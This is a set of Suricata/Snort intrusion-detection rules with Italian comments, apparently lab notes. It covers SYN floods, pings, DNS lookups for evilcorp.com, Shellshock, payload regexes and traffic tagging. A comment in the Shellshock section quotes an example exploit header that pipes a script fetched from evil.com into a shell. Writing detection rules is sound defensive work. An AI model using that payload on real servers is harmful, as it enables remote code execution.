# Syn Flood DDoS ==============================================================

alert tcp any any -> 172.22.2.142 25 ( msg:"SYN-FLOOD DETECTED"; flags:S; flow:stateless; detection_filter:track by_dst, count 10, seconds 1; sid:1000002; rev:1; )

# Come funziona:
# tcp any any -> 172.22.2.142 25: monitora solo il traffico verso quella destinazione.
# flags:S;: SYN puro → connessioni in avvio.
# flow:stateless;: non richiede sessioni TCP valide (utile contro IP spoofing).
# detection_filter:track by_dst, count 10, seconds 1;: fa scattare l’allerta se ci sono 10 SYN in 1 secondo alla stessa destinazione.


# ICMP Rules ===================================================================

# Rileva ping ICMP (Echo Request) provenienti dalla rete 192.168.0.0/16
alert icmp 192.168.0.0/16 any -> $HOME_NET any (msg:"Ping Detected"; itype:8; sid:1000002; rev:1;)

# Ping generico verso HOME_NET
alert icmp any any -> $HOME_NET any (msg:"ICMP Ping detected"; itype:8; sid:1000503; classtype:icmp-event; rev:1; priority:3; )

# DNS Detection ================================================================

# DNS query contenente "evilcorp.com"
alert dns any any -> any any (msg:"Request to ecorp detected"; content:"evilcorp.com"; nocase; dns_query; sid:1000003; rev:1; )

# Traffico IP generico, utile per logging o matching su payload 
alert ip any any -> any any (msg:"Request to ecorp detected"; content:"evilcorp.com"; sid:1000004; rev:1;)

# DNS con contenuto sospetto (es. dominio malevolo)
alert udp any any -> $HOME_NET 53 (msg:"Suspicious DNS query detected"; content:"malicious_domain"; nocase; sid:1000501; rev:1; priority:2; classtype:dns-query;)

# Shellshock ===================================================================
# La regola rileva tentativi di exploit Shellshock tramite header HTTP, come ad esempio:
# User-Agent: () { :; }; /bin/bash -c 'curl evil.com/malware.sh | sh'

alert http any any -> any any (msg:"Volex – Possible CVE-2014-6271 bash Vulnerability Requested (header)"; flow:established,to_server; content:"() {"; http_header; threshold:type limit, track by_src, count 1, seconds 120; sid:2014092401;)

# TCP Payload & Regex ========================================================== 

# Rileva payload con sequenza "AAAABBBB" e regex di tipo bruteforce
alert tcp 172.22.2.0/24 any -> 172.23.3.0/24 80 (msg:"Payload bruteforce detected"; content:"AAAABBBB"; pcre:"/^A+B{4}$/"; sid:1000055; priority:2; rev:1;)

# Rileva pattern simile a una flag tipo CTF (FLAG{...}) su porta 23 (Telnet)
alert tcp any any -> 10.10.10.10 23 (msg:"Flag Detected"; pcre:"/FLAG\{[a-zA-Z0-9_]+\}/"; sid:1000056; priority:2; rev:1;)

# Generic Suspicious Traffic ====================================================
# Rileva traffico TCP sospetto verso server con contenuto noto
alert tcp any any -> $HOME_NET any (msg:"Suspicious TCP traffic detected"; content:"malicious_payload"; flow:to_server,established; sid:1000500; rev:1; priority:1; classtype:trojan-activity;)

# Rileva traffico HTTPS sospetto verso server (es. tunneling)
alert tcp any any -> $HOME_NET 443 (msg:"Suspicious HTTPS traffic detected"; flow:to_server,established; content:"malicious_https_payload"; sid:1000502; rev:1; priority:2; classtype:trojan-activity;)

# Generic rules =================================================================
# analizza il traffico TLS (quindi HTTPS) e genera un alert quando 
# rileva una connessione verso facebook.com nel campo SNI (Server Name Indication). Vediamola riga per riga:

alert tls any any -> any any (
  msg:"SURICATA TRAFFIC-ID: facebook";
  tls_sni; content:"facebook.com"; isdataat:!1,relative;
  flow:to_server,established;
  flowbits:set,traffic/id/facebook;
  flowbits:set,traffic/label/socialnetwork;
  sid:300000001; rev:1;
)

